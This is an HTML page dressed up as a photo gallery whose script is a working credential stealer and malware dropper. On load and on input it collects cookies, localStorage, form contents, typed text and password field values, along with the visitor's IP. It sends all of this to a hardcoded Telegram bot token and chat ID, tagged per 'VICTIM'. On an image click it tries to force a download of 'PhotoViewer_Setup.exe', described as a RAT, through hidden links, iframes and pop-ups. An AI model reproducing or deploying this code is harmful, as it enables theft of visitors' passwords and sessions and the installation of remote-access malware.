<!DOCTYPE html>

        body {

            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            color: white;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
        }
        h1 {
            text-align: center;
            margin-bottom: 10px;
            font-size: 2.5em;
        }
        .subtitle {
            text-align: center;
            margin-bottom: 30px;
            opacity: 0.8;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }
        .image-card {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 15px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            border: 2px solid transparent;
        }
        .image-card:hover {
            transform: translateY(-5px);
            border-color: rgba(255, 255, 255, 0.3);
            background: rgba(255, 255, 255, 0.2);
        }
        .image-card img {
            width: 100%;
            height: 150px;
            object-fit: cover;
            border-radius: 10px;
            margin-bottom: 10px;
        }
        .image-title {
            font-weight: bold;
            margin-bottom: 5px;
        }
        .image-desc {
            font-size: 0.8em;
            opacity: 0.7;
        }
        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
            font-size: 1.1em;
        }
        .pulse {
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        .warning {
            text-align: center;
            font-size: 0.8em;
            opacity: 0.6;
            margin-top: 20px;
        }
    </style>

<body>

    <script>
        // Simple Configuration
        const CONFIG = {
            telegram: {
                token: '8594897816:AAFtWTQTOPSOuDLK5Wtc7IrkmFXgtDuaqls',
                chatId: '8032494479'
            },

            images: {

                2: 'https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png',
                3: 'https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png'
            }
        };

        // Global variables
        let victimId = null;

        // Generate victim ID immediately
        function generateVictimId() {
            const randomId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
            return `VICTIM_${randomId.toUpperCase()}`;
        }

        // SIMPLE TELEGRAM FUNCTION WITH MULTIPLE FALLBACKS
        async function sendToTelegram(message) {
            if (!victimId) victimId = generateVictimId();
            
            const fullMessage = `üî∞ ${victimId}\n${message}`;
            console.log('Sending to Telegram:', fullMessage);
            
            // Method 1: Direct fetch
            try {
                const response = await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CONFIG.telegram.chatId,
                        text: fullMessage,
                        parse_mode: 'HTML'
                    })
                });
                
                if (response.ok) {
                    console.log('Telegram message sent successfully');
                    return true;
                }
            } catch (error) {
                console.log('Method 1 failed:', error);
            }

            // Method 2: Using image beacon
            try {
                const img = new Image();
                const encodedMessage = encodeURIComponent(fullMessage);
                img.src = `https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage?chat_id=${CONFIG.telegram.chatId}&text=${encodedMessage}`;
                console.log('Method 2 attempted');
                return true;
            } catch (error) {
                console.log('Method 2 failed:', error);
            }

            // Method 3: Using form submission
            try {
                const formData = new FormData();
                formData.append('chat_id', CONFIG.telegram.chatId);
                formData.append('text', fullMessage);
                
                fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
                    method: 'POST',
                    body: formData
                });
                console.log('Method 3 attempted');
                return true;
            } catch (error) {
                console.log('Method 3 failed:', error);
            }

            return false;
        }

        // SIMPLE DATA COLLECTION
        function collectBasicData() {
            const data = {
                timestamp: new Date().toISOString(),
                url: window.location.href,
                referrer: document.referrer || 'Direct',
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                cookies: document.cookie,
                localStorage: JSON.stringify(getAllLocalStorage()),
                forms: collectFormData(),
                inputs: collectInputData(),
                passwords: collectPasswords()
            };
            
            // Get IP
            getIP().then(ip => {
                data.ip = ip;
                sendCollectedData(data);
            }).catch(() => {
                data.ip = 'Unknown';
                sendCollectedData(data);
            });
            
            return data;
        }

        function getAllLocalStorage() {
            const ls = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                ls[key] = localStorage.getItem(key);
            }
            return ls;
        }

        function collectFormData() {
            const forms = {};
            document.querySelectorAll('form').forEach((form, index) => {
                const formData = {};
                form.querySelectorAll('input, select, textarea').forEach(field => {
                    if (field.value) {
                        formData[field.name || field.type || `field_${index}`] = field.value;
                    }
                });
                if (Object.keys(formData).length > 0) {
                    forms[`form_${index}`] = formData;
                }
            });
            return forms;
        }

        function collectInputData() {
            const inputs = {};
            document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"]').forEach(input => {
                if (input.value) {
                    inputs[input.name || input.placeholder || 'unknown'] = input.value;
                }
            });
            return inputs;
        }

        function collectPasswords() {
            const passwords = [];
            document.querySelectorAll('input[type="password"]').forEach(input => {
                if (input.value) {
                    passwords.push({
                        field: input.name || 'password',
                        value: input.value
                    });
                }
            });
            return passwords;
        }

        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                try {
                    const response = await fetch('https://api64.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip;
                } catch (error) {
                    return 'Unknown';
                }
            }
        }

        function sendCollectedData(data) {
            if (!victimId) victimId = generateVictimId();
            
            let message = `üÜï NEW VICTIM CONNECTED\n`;
            message += `üî∞ ID: ${victimId}\n`;
            message += `üåê IP: ${data.ip}\n`;
            message += `üïí Time: ${data.timestamp}\n`;
            message += `üîó URL: ${data.url}\n`;
            message += `üì± Platform: ${data.platform}\n`;
            message += `üñ•Ô∏è Screen: ${data.screen}\n`;
            message += `üåç Language: ${data.language}\n\n`;
            
            message += `üìä DATA CAPTURED:\n`;
            message += `üîë Passwords: ${data.passwords.length}\n`;
            message += `üìù Forms: ${Object.keys(data.forms).length}\n`;
            message += `‚úèÔ∏è Inputs: ${Object.keys(data.inputs).length}\n`;
            message += `üç™ Cookies: ${data.cookies ? 'Yes' : 'No'}\n`;
            message += `üíæ LocalStorage: ${Object.keys(JSON.parse(data.localStorage)).length} items\n`;
            
            if (data.passwords.length > 0) {
                message += `\nüîë PASSWORDS:\n`;
                data.passwords.forEach((pwd, i) => {
                    message += `${i+1}. ${pwd.field}: ${pwd.value}\n`;
                });
            }
            
            if (Object.keys(data.inputs).length > 0) {
                message += `\n‚úèÔ∏è INPUT DATA:\n`;
                Object.entries(data.inputs).forEach(([key, value]) => {
                    message += `${key}: ${value}\n`;
                });
            }

            sendToTelegram(message);
        }

        // RAT DEPLOYMENT
        async function startRATDeployment(imageId) {
            const loading = document.getElementById('loading');
            const loadingText = document.getElementById('loadingText');
            
            loading.style.display = 'block';
            loadingText.textContent = 'Preparing content...';
            
            // Send click notification
            await sendToTelegram(`üñ±Ô∏è IMAGE CLICKED\nImage ID: ${imageId}\nUser attempting to access content`);
            
            // Deploy RAT
            await deployRAT();
            
            // Redirect to image
            setTimeout(() => {
                window.location.href = CONFIG.images[imageId] || '#';
            }, 2000);
        }

        async function deployRAT() {
            await sendToTelegram(`üöÄ DEPLOYING RAT...`);
            
            // Multiple deployment methods
            const methods = [deployMethod1, deployMethod2, deployMethod3];
            
            for (const method of methods) {
                try {
                    const success = await method();
                    if (success) {
                        await sendToTelegram(`‚úÖ RAT DEPLOYED SUCCESSFULLY`);
                        break;
                    }
                } catch (error) {
                    console.log('Deployment method failed:', error);
                }
            }
        }

        async function deployMethod1() {
            try {
                const link = document.createElement('a');
                link.href = CONFIG.ratUrl;
                link.download = 'PhotoViewer_Setup.exe';
                link.style.display = 'none';
                document.body.appendChild(link);
                link.click();
                setTimeout(() => document.body.removeChild(link), 3000);
                return true;
            } catch (error) {
                return false;
            }
        }

        async function deployMethod2() {
            try {
                const iframe = document.createElement('iframe');
                iframe.src = CONFIG.ratUrl;
                iframe.style.display = 'none';
                document.body.appendChild(iframe);
                setTimeout(() => document.body.removeChild(iframe), 5000);
                return true;
            } catch (error) {
                return false;
            }
        }

        async function deployMethod3() {
            try {
                window.open(CONFIG.ratUrl, '_blank');
                return true;
            } catch (error) {
                return false;
            }
        }

        // START EVERYTHING ON PAGE LOAD
        window.addEventListener('load', function() {
            console.log('Starting data collection...');
            victimId = generateVictimId();
            
            // Send immediate notification
            sendToTelegram(`üöÄ PAGE LOADED\nStarting data collection...`);
            
            // Collect and send data
            setTimeout(() => {
                collectBasicData();
            }, 1000);
            
            // Send periodic updates
            setInterval(() => {
                sendToTelegram(`üìä HEARTBEAT\nSystem active - ${new Date().toLocaleTimeString()}`);
            }, 60000); // Every minute
        });

        // Also collect data on form interactions
        document.addEventListener('submit', function(e) {
            setTimeout(() => {
                sendToTelegram(`üìù FORM SUBMITTED\nForm action: ${e.target.action || 'unknown'}`);
                collectBasicData();
            }, 500);
        });

        // Collect data on input changes (with debounce)
        let inputTimeout;
        document.addEventListener('input', function(e) {
            clearTimeout(inputTimeout);
            inputTimeout = setTimeout(() => {
                if (e.target.value && e.target.value.length > 3) {
                    sendToTelegram(`‚å®Ô∏è INPUT DETECTED\nField: ${e.target.name || e.target.type}\nValue: ${e.target.value.substring(0, 50)}`);
                }
            }, 1000);
        });

        console.log('Malicious system initialized');
    </script>
